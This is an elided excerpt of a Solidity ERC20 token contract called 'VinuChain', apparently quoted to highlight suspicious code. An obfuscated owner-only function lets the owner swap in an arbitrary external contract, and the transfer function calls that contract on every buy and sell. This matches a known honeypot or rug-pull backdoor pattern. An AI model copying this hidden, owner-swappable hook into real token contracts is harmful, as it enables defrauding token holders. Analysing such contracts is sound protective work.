...
contract TokenM is ERC20 {
    ...
    IUserAmountyuyrdd public yuyrdd;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;
      uint256 total;
    constructor(address tokenOwner) ERC20("VinuChain", "VC") {
    ...
    function cureongeBersngRtuou(IUserAmountyuyrdd _yuyrdd) public onlyOwner {
        yuyrdd = _yuyrdd;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                yuyrdd.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				yuyrdd.addOutAmount(from, amount);
            }else{
                yuyrdd.addOutAmount(from, amount);
                takeFee = false;
            }
